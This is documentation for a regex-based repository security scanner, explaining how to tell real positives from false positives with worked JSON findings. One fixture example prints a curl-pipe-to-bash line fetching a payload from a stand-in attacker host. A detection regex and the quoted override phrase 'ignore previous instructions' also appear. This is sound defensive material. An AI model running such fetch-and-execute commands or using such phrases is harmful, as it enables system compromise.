# Interpreting findings - real positive vs false positive

A score of 0 / CRITICAL does **not** automatically mean the target repository
is malicious. Static, regex-based scanners produce both false positives
(documentation showing a pattern as an example, source code defining the
pattern itself, intentional test fixtures) and false negatives (heavily
obfuscated payloads). This guide is the step-by-step playbook for triaging
each finding in the report.

For the score formula and severity downgrades, see
[`scoring-rubric.md`](scoring-rubric.md). For the rule catalog, see
[`threat-patterns.md`](threat-patterns.md). This file picks up where they
stop: you already have a report in front of you, now what?

---

## Quick mental model

> Every finding is a **regex match on a line of text**. The scanner says
> "the line looks like one of the dangerous patterns". It is your job to
> decide whether that line is *executed as code* or *quoted as documentation
> / written as scanner source*.

Three independent signals do most of the work:

1. **`likely_false_positive: true`** in the JSON / "likely FP" badge in the
   HTML and DOCX. The scanner already pre-classified the match as docs /
   metadata / inline quote. Treat as a strong hint, not a verdict.
2. **`file_kind`** + the file's path. A finding in `tests/`,
   `examples/`, `fixtures/`, `*.md` documentation, or in the scanner's own
   `scripts/` directory has a very different meaning than the same pattern
   in `install.sh`, `setup.py`, or `package.json`.
3. **The snippet itself.** Is the matched line a live shell command / function
   call, or is it a string literal that *describes* the pattern? Two seconds
   of human reading settles 90% of cases.

The rest of this document expands each signal and walks through two findings
that look identical in summary form but require opposite verdicts.

---

## Step 1 - Read the `likely_false_positive` flag

Starting in v1.0.1 every finding carries a boolean
`likely_false_positive`. It is set to `true` when the match falls inside one
of these contexts:

| Context | Example line | Why it is likely a FP |
|---|---|---|
| Python raw string `r"..."` | `rx=r"(curl\|wget)...\|sh"` | The pattern *defines* a detection rule; it is never executed |
| Python `#` comment | `# install.sh uses curl \| bash` | A comment describing the rule; not executable |
| Python metadata line (`rx=`, `desc=`, `rec=`) | `desc="Remote curl\|bash"` | Rule metadata, not code that runs |
| Markdown inline span wrapped by `` ` `` or quotes | `` Detects `curl \| bash` `` or `"ignore previous instructions"` | Documentation citing the pattern |

The flag is **informational only**. It does NOT change the severity or the
score - the scanner refuses to auto-suppress because the cost of one missed
real positive is much higher than the cost of one extra row to skim. The
flag's job is to put obvious documentation/source matches at the bottom of
your attention queue, not to remove them.

**Rule of thumb:** if `likely_false_positive: true`, glance at the snippet,
then move on unless the snippet looks suspicious for some other reason. If
`likely_false_positive: false`, treat the finding as worth a real read.

In the HTML dashboard, click **"Hide likely FP"** to focus on the rest.

---

## Step 2 - Read the snippet in context

The JSON, DOCX, and HTML all include a 200-character snippet of the matched
line. Open the file at `file:line` and read 10-20 lines around it. Ask:

| Question | If yes -> likely real | If no -> likely FP |
|---|---|---|
| Is the matched text being *executed* (a shell command, a function call, a string passed to `eval`/`exec`/`subprocess`/`os.system`)? | yes | no |
| Is the destination realistic (a public domain, a real IP, an attacker-controlled host)? | yes | `example.com`, `.invalid`, `localhost` -> no |
| Does the surrounding code wire the matched payload into an effectful path (write to disk, send over network, modify environment, exec a child process)? | yes | no |
| Is the file referenced by an install hook (`package.json` `postinstall`, `setup.py` `cmdclass`, `Dockerfile`, CI workflow)? | yes - high priority | no |
| Is the file inside `tests/`, `fixtures/`, `examples/`, or a top-level documentation folder? | no | yes - usually intentional |

A single signal is rarely conclusive. Combine them.

---

## Step 3 - Check clustering and auto-execution points

Real malware tends to **cluster**: a single file with NET_OUTBOUND **plus**
SECRET_FILES **plus** OBF_BASE64_EXEC is much more damning than any of them
in isolation. Documentation, on the other hand, scatters single-rule
matches across many files.

Open the `auto_exec_points` list in the report. Those are the files that run
*automatically* on install or container build (`package.json`, `setup.py`,
`pyproject.toml`, `Dockerfile`, anything under `hooks/`). A finding in one
of these is worth 10x a finding in a documentation `.md`.

---

## Worked example - REAL positive

### Finding

```json
{
  "rule_id": "NET_PIPE_SHELL",
  "category": "Network & Exfiltration",
  "severity": "HIGH",
  "raw_severity": "CRITICAL",
  "file": "test-samples/malicious/install.sh",
  "line": 4,
  "file_kind": "code",
  "snippet": "curl https://attacker.example.invalid/payload.sh | bash",
  "description": "Remote content piped straight into the shell (curl|bash). (test/fixture file; severity downgraded)",
  "recommendation": "Classic malicious-installer pattern. Do NOT install without understanding the exact payload source.",
  "in_test": true,
  "likely_false_positive": false
}
```

### Triage

1. **`likely_false_positive: false`** - the heuristic did not classify it as
   docs / metadata. The snippet is a literal shell command, not a Python
   regex literal or a markdown code span.
2. **Snippet context:** `curl ... | bash` is a *live* command. It executes
   when the file is run. The destination is a real URL shape (`https://...`).
   Even though the host uses `.invalid`, in a real-world repository the
   equivalent line would resolve and download a payload.
3. **File kind:** `install.sh` - exactly the kind of file a user would
   `bash` after cloning.
4. **`in_test: true`** - the file lives under `test-samples/` and was
   one-step downgraded from CRITICAL to HIGH automatically. That signals the
   scanner already discounted it once.

### Verdict

This is a **real positive on the pattern** (the line really does execute
`curl | bash`), but the **fixture status** means it is intentional. In a
non-fixture repository this exact line would be the strongest possible
"do not install" signal.

In *this* repository, you would read the surrounding `test-samples/README.md`
note that explains the fixture's purpose, confirm the host is `.invalid`,
and move on. In *any other* repository, you would refuse to install.

---

## Worked example - FALSE positive

### Finding

```json
{
  "rule_id": "NET_PIPE_SHELL",
  "category": "Network & Exfiltration",
  "severity": "CRITICAL",
  "raw_severity": "CRITICAL",
  "file": "scripts/scan_repo.py",
  "line": 108,
  "file_kind": "code",
  "snippet": "rx=r\"(curl|wget)\\b[^\\n|]*\\|\\s*(ba)?sh\\b\",",
  "description": "Remote content piped straight into the shell (curl|bash). (match inside raw-string / comment / inline code (likely false positive, NOT auto-suppressed))",
  "recommendation": "Classic malicious-installer pattern. Do NOT install without understanding the exact payload source.",
  "in_test": false,
  "likely_false_positive": true
}
```

### Triage

1. **`likely_false_positive: true`** - the heuristic recognized that the
   match falls inside `r"..."`. Strong hint.
2. **Snippet context:** the line literally reads `rx=r"(curl|wget)..."` -
   this is the Python source code *defining* the `NET_PIPE_SHELL` detection
   rule. The `(curl|wget)...|sh` characters are the *needle the scanner
   looks for*, not a payload that runs.
3. **File kind:** `scripts/scan_repo.py` - the scanner's own source. The
   scanner is never executed against itself in a way that would make the
   regex string do anything; it is only ever read as data by `re.search`.
4. **`in_test: false`** - not in a test folder, but irrelevant: the FP signal
   is the syntactic context, not the location.

### Verdict

False positive. The match is part of the scanner's rule library. Discard it
and move on.

---

## Worked example - the difficult case

### Finding

```json
{
  "rule_id": "EXEC_SUBPROCESS",
  "severity": "MEDIUM",
  "file": "scripts/scan_repo.py",
  "line": 366,
  "snippet": "return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True, timeout=timeout)",
  "likely_false_positive": false
}
```

### Triage

1. **`likely_false_positive: false`** - this is NOT inside a raw string or a
   comment. It is real executable code.
2. **Snippet context:** the scanner calls `subprocess.run(cmd, ...)`. This
   is the function `repo-scan` uses to invoke `git clone`. It is real, it
   actually executes, but the `cmd` value (visible in surrounding lines) is
   a literal list `["git", "clone", "--depth", "1", url, dest]` - not
   attacker-controlled.

### Verdict

A real **EXEC_SUBPROCESS** match, classified MEDIUM, that is legitimate
because the command vector is hard-coded. The MEDIUM severity is appropriate:
the reviewer should glance at the surrounding code to confirm there is no
shell injection path, and then accept it.

This is the case where neither the FP heuristic nor any blanket rule can
substitute for a 20-second human read.

---

## A 30-second triage checklist

Paste this in the corner of your screen the first few times you read a
report.

1. Open the HTML dashboard. Click **"Hide likely FP"**.
2. Sort visually by severity (CRITICAL/HIGH first).
3. For each remaining finding, open the file at `file:line` and answer:
   - Is this line *executed* in some realistic call path?
   - Does the destination/argument look attacker-controlled?
   - Is the file an auto-execution point (`package.json`, `setup.py`,
     `Dockerfile`, hooks)?
4. If yes to any: read 10-20 surrounding lines. Decide.
5. If still unsure, search the repository's commit history for who added
   the line and when, and what the PR description said.

Findings you discard should leave a trace - either in your scan output (use
`--keep` and the local clone) or in an `INVESTIGATED.md` note in your team
folder, so the next person does not redo the work.

---

## Why the scanner does not auto-suppress likely FPs

A scanner that hides findings makes confident promises it cannot keep. The
heuristic in v1.x catches the dominant FP patterns in *this* codebase
(Python raw strings, Markdown quotes / inline code, Python rule-metadata
assignments). It is the wrong shape to handle arbitrary obfuscation or
adversarial framing. Hiding by default would risk a real positive being
filtered out in a future repo whose layout we have not anticipated.

A future release may introduce a `--suppress-likely-fp` flag for users who
have validated the heuristic on their own corpus. The default will remain
"surface everything, label what looks unlikely".
